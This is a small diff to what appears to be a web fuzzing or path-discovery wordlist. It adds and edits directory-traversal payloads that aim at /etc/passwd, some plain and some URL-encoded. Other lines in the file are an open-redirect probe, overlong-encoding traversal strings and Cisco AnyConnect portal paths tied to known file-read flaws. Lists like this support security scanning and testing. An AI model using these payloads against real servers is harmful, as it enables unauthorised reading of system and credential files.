@@ -2,6 +2,7 @@
 !.htaccess
 !.htpasswd
 %2e%2e//google.com
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 %2e%2e;/test
 %3f/
 %C0%AE%C0%AE%C0%AF
@@ -38,7 +39,7 @@
 +CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
 +CSCOT+/translation
 +CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
-.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+../../../../../../etc/passwd
 ..;/
 .0
 .7z
